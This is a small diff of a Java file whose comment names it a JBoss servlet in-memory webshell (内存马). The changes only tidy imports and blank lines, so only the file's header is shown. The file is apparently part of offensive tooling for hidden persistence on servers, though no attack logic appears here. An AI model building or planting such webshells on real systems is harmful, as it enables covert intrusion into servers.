@@ -9,19 +9,16 @@ import io.undertow.servlet.spec.HttpServletRequestImpl;
 import io.undertow.servlet.spec.ServletRegistrationImpl;
 import io.undertow.servlet.util.ConstructorInstanceFactory;
 
-
 import javax.security.jacc.PolicyContext;
 import javax.servlet.*;
 import java.lang.reflect.Field;
-
 import java.lang.reflect.Modifier;
 import java.util.Map;
-
-import static org.fusesource.jansi.Ansi.ansi;
 
 
 /**
  * jboss Servlet 内存马
+ *
  * @author QI4L
  */
 public class JBSMSFromContextS implements Servlet {
